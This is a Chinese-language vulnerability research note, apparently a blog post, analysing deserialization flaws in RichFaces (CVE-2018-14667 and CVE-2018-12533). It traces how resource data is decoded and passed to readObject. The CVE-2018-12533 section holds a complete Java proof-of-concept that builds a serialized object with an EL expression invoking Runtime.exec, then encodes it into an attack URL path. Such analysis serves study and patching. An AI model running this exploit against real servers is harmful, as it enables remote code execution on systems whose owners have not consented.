

# RichFaces

关于它的一些比较有趣的漏洞

- [x] https://paper.seebug.org/766/
- [x] https://xz.aliyun.com/t/10757#toc-5
- [x] https://xz.aliyun.com/t/3264
- [x] https://github.com/syriusbughunt/CVE-2018-14667

这里poc的使用，建议采用以下环境

```
    <dependencies>
        <!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-el-api -->
        <dependency>
            <groupId>org.apache.tomcat</groupId>
            <artifactId>tomcat-el-api</artifactId>
            <version>8.5.75</version>
        </dependency>

    </dependencies>
    <properties>
        <maven.compiler.source>16</maven.compiler.source>
        <maven.compiler.target>16</maven.compiler.target>
    </properties>
```

el-api改成环境的版本，然后把给的war里面的lib全部粘贴进去，`el-api`删不删看你

## 0x01 CVE-2018-14667

- 环境搭建

  http://downloads.jboss.org/richfaces/releases/3.3.X/3.3.3.Final/richfaces-demo-3.3.3.Final-tomcat6.war

`richfaces-demo-3.3.6.GA-tomcat6`+`jdk16`+`tomcat8.5.60`

一些调试配置。

```
set JPDA_ADDRESS=8090
catalina.bat jpda start
```

- 开始

  入口`BaseFilter#doFilter`=>`InternetResourceService#serviceResource`=>`ResourceBuilderImpl#getResourceForKey`=>

  在`serviceResource`中有两个代码

  ```
  resourceKey: url
  resource = this.getResourceBuilder().getResourceForKey(resourceKey);
  Object resourceDataForKey = this.getResourceBuilder().getResourceDataForKey(resourceKey);
  ```

  第一句是根据DATA/B来获取前面的key拿到`resource`,第二句里面就是对生成的payload部分进行处理，继续看
  `decrypt`第一步
  
  ```java
  try {
              byte[] zipsrc = this.codec.decode(src);//d为null 就是base64
              Inflater decompressor = new Inflater();
              byte[] uncompressed = new byte[zipsrc.length * 5];
              decompressor.setInput(zipsrc);
              int totalOut = decompressor.inflate(uncompressed);
              byte[] out = new byte[totalOut];
              System.arraycopy(uncompressed, 0, out, 0, totalOut);
              decompressor.end();
              return out;
          } catch (Exception var7) {
              throw new FacesException("Error decode resource data", var7);
          }
  ```
  
  就是后面的数据就是一个base64decode然后一个zip解压缩。我们生成就应该是zip然后base64。回到`getResourceDataForKey`
  
  ```
  try {
                  byte[] dataArray = dataString.getBytes("ISO-8859-1");
                  objectArray = this.decrypt(dataArray);
              } catch (UnsupportedEncodingException var12) {
              }
  
              if ("B".equals(matcher.group(1))) {
                  data = objectArray;
              } else {
                  try {
                      ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(objectArray));
                      data = in.readObject();
  ```
  
  就会对上面解密的数据进行`readObject`了，现在就是找个链子了？我这个版本感觉可以使用yso来生成链子因为是用的`ObjectInputStream`，我们换个高版本看看。（我没找到有过滤的.....
  
  找到有过滤的
  
  ```java
  whitelistClassNameCache = {ConcurrentHashMap@17346}  size = 23
   "[Ljava.lang.Integer;" -> {Boolean@17383} true
   "javax.faces.component.StateHolderSaver" -> {Boolean@17383} true
   "[Ljava.lang.Boolean;" -> {Boolean@17383} true
   "[Ljava.lang.Float;" -> {Boolean@17383} true
   "javax.el.Expression" -> {Boolean@17383} true
   "[Ljava.lang.Byte;" -> {Boolean@17383} true
   "[Ljava.lang.Character;" -> {Boolean@17383} true
   "[Ljava.lang.Double;" -> {Boolean@17383} true
   "[Ljava.lang.String;" -> {Boolean@17383} true
   "javax.el.MethodExpression" -> {Boolean@17383} true
   "com.sun.facelets.el.TagMethodExpression" -> {Boolean@17383} true
   "org.jboss.seam.el.OptionalParameterMethodExpression" -> {Boolean@17383} true
   "org.richfaces.demo.paint2d.PaintData" -> {Boolean@17383} true
   "[Ljava.lang.Object;" -> {Boolean@17383} true
   "org.richfaces.renderkit.html.Paint2DResource$ImageData" -> {Boolean@17383} true
   "[Ljava.lang.Long;" -> {Boolean@17383} true
   "org.richfaces.ui.application.StateMethodExpressionWrapper" -> {Boolean@17383} true
   "javax.el.ValueExpression" -> {Boolean@17383} true
   "org.jboss.el.MethodExpressionImpl" -> {Boolean@17383} true
   "com.sun.facelets.el.LegacyMethodBinding" -> {Boolean@17383} true
   "[Ljava.lang.Short;" -> {Boolean@17383} true
   "[Ljava.lang.Void;" -> {Boolean@17383} true
   "org.jboss.el.ValueExpressionImpl" -> {Boolean@17383} true
  ```
  
  `org.richfaces.demo.paint2d.PaintData`这是另外一个cve的入口。所以我们不用那个题目环境，换成另外一个。urlsource继续操作就是下面这个样子了，对于el表达式进行解析，这也是`MethodExpression`的作用吧。
  
  他把这个入口给封了
  
  ```
  public void send(ResourceContext context) throws IOException {
          UserResource.UriData data = (UserResource.UriData)this.restoreData(context);
          FacesContext facesContext = FacesContext.getCurrentInstance();
          if (null != data && null != facesContext) {
              ELContext elContext = facesContext.getELContext();
              OutputStream out = context.getOutputStream();
              MethodExpression send = (MethodExpression)UIComponentBase.restoreAttachedState(facesContext, data.createContent);
              send.invoke(elContext, new Object[]{out, data.value});
          }
  
      }
  ```
  
  最后进行的几个操作就是到invoke操作上来。所以我们还是利用上面d



## 0x02 CVE-2018-12533

```
javax.faces.component.StateHolderSaver
    com.sun.facelets.el.LegacyMethodBinding
        com.sun.facelets.el.TagMethodExpression # 这里可以bypass
            com.sun.facelets.tag.TagAttribute
            org.jboss.el.MethodExpressionImpl
                expr = poc
```

```
import com.sun.facelets.el.LegacyMethodBinding;
import com.sun.facelets.el.TagMethodExpression;
import com.sun.facelets.tag.TagAttribute;
import com.sun.facelets.tag.Location;
import org.ajax4jsf.util.base64.URL64Codec;
import org.jboss.el.MethodExpressionImpl;

import javax.faces.context.FacesContext;
import javax.faces.el.MethodBinding;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.zip.Deflater;

public class CVE_2018_12533 {
    public static void main(String[] args) throws Exception{
        String pocEL = "#{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open /Applications/Calculator.app\")}";
        // 根据文章https://www.anquanke.com/post/id/160338
        Class cls = Class.forName("javax.faces.component.StateHolderSaver");
        Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);
        ct.setAccessible(true);

        Location location = new Location("", 0, 0);
        TagAttribute tagAttribute = new TagAttribute(location, "", "", "", "createContent="+pocEL);

        // 1. 设置ImageData
        //    构造ImageData_paint
        MethodExpressionImpl methodExpression = new MethodExpressionImpl(pocEL, null, null, null, null, new Class[]{OutputStream.class, Object.class});
        TagMethodExpression tagMethodExpression = new TagMethodExpression(tagAttribute, methodExpression);
        MethodBinding methodBinding = new LegacyMethodBinding(tagMethodExpression);
        Object _paint = ct.newInstance(null, methodBinding);

        Class clzz = Class.forName("org.richfaces.renderkit.html.Paint2DResource");
        Class innerClazz[] = clzz.getDeclaredClasses();
        for (Class c : innerClazz){
            int mod = c.getModifiers();
            String modifier = Modifier.toString(mod);
            if (modifier.contains("private")){
                Constructor cc = c.getDeclaredConstructor();
                cc.setAccessible(true);
                Object imageData = cc.newInstance(null);

                //    设置ImageData_width
                Field _widthField = imageData.getClass().getDeclaredField("_width");
                _widthField.setAccessible(true);
                _widthField.set(imageData, 300);

                //    设置ImageData_height
                Field _heightField = imageData.getClass().getDeclaredField("_height");
                _heightField.setAccessible(true);
                _heightField.set(imageData, 120);

                //    设置ImageData_data
                Field _dataField = imageData.getClass().getDeclaredField("_data");
                _dataField.setAccessible(true);
                _dataField.set(imageData, null);

                //    设置ImageData_format
                Field _formatField = imageData.getClass().getDeclaredField("_format");
                _formatField.setAccessible(true);
                _formatField.set(imageData, 2);

                //    设置ImageData_paint
                Field _paintField = imageData.getClass().getDeclaredField("_paint");
                _paintField.setAccessible(true);
                _paintField.set(imageData, _paint);

                //    设置ImageData_paint
                Field cacheableField = imageData.getClass().getDeclaredField("cacheable");
                cacheableField.setAccessible(true);
                cacheableField.set(imageData, false);

                //    设置ImageData_bgColor
                Field _bgColorField = imageData.getClass().getDeclaredField("_bgColor");
                _bgColorField.setAccessible(true);
                _bgColorField.set(imageData, 0);

                // 2. 序列化
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                objectOutputStream.writeObject(imageData);
                objectOutputStream.flush();
                objectOutputStream.close();
                byteArrayOutputStream.close();

                // 3. 加密（zip+base64）
                byte[] pocData = byteArrayOutputStream.toByteArray();
                Deflater compressor = new Deflater(1);
                byte[] compressed = new byte[pocData.length + 100];
                compressor.setInput(pocData);
                compressor.finish();
                int totalOut = compressor.deflate(compressed);
                byte[] zipsrc = new byte[totalOut];
                System.arraycopy(compressed, 0, zipsrc, 0, totalOut);
                compressor.end();
                byte[]dataArray = URL64Codec.encodeBase64(zipsrc);

                // 4. 打印最后的poc
                String poc = "/DATA/" + new String(dataArray, "ISO-8859-1") + ".jsf";
                System.out.println(poc);
            }
        }
    }
}
```

![image-20220531112517791](https://img.dem0dem0.top/image-20220531112517791.png)
